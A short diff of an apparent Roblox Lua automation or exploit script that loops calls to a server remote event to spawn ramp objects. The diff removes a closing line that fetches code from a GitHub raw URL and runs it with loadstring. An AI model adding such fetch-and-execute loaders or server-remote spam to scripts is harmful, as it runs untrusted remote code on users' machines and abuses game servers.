@@ -67,5 +67,3 @@ while wait() do --game:GetService("ReplicatedStorage").Events.AddObject:InvokeSe
 		game:GetService("ReplicatedStorage").Events.AddObject:InvokeServer("Slow Ramp Track", RampPos)
 	end
 end
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/kw-roblox/OCkey/main/test"))()
